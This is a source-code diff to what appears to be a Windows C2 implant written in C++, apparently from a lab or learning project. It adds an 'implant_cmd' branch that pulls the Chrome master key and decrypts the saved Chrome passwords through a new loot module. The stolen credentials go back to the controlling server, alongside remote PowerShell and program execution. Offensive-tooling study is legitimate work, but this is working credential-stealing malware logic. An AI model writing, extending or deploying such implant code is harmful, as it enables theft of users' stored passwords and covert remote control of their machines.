@@ -7,6 +7,7 @@
 #include "file_io/file_io.h"
 #include "sitawareness/sitawareness.hpp"
 #include "config/config.hpp"
+#include "loot/loot.hpp"
 
 using json = nlohmann::json;
 
@@ -72,11 +73,30 @@ int main(){
         LPSTR cmd =  const_cast<char *>(cmd_text.c_str());
         if (command["command_type"] == "shell"){
             cmd_result = runPowershellCommand(cmd);
-        }else{
-           cmd_result = runProgram(cmd);
+        }else if (command["command_type"] == "implant_cmd"){
+            if(command["command_text"]=="chrome_passwords"){
+                unsigned char* masterKey = new unsigned char[MASTER_KEY_SIZE];
+
+                getMasterKey(masterKey, "vagrant");
+                printUCharAsHex(masterKey, MASTER_KEY_SIZE);
+
+                json jsonResult = lootChromePasswords((const unsigned char*) masterKey, "vagrant");
+                cmd_result = jsonResult.dump();
+                std::cout << "jsonResult: " << jsonResult.dump(4) << std::endl;
+
+                delete[] masterKey;
+            }else if(command["command_text"]=="situational_awareness"){
+                cmd_result = info;
+                std::cout << info << std::endl;
+            }
+        }else if(command["command_type"] == "system_program"){
+            cmd_result = runProgram(cmd);
         }
-       std::cout << sendCommandResult(config,cmd_id,cmd_result) << std::endl;
+        std::cout << sendCommandResult(config,cmd_id,cmd_result) << std::endl;
     }
+    
+
+
 
 
 
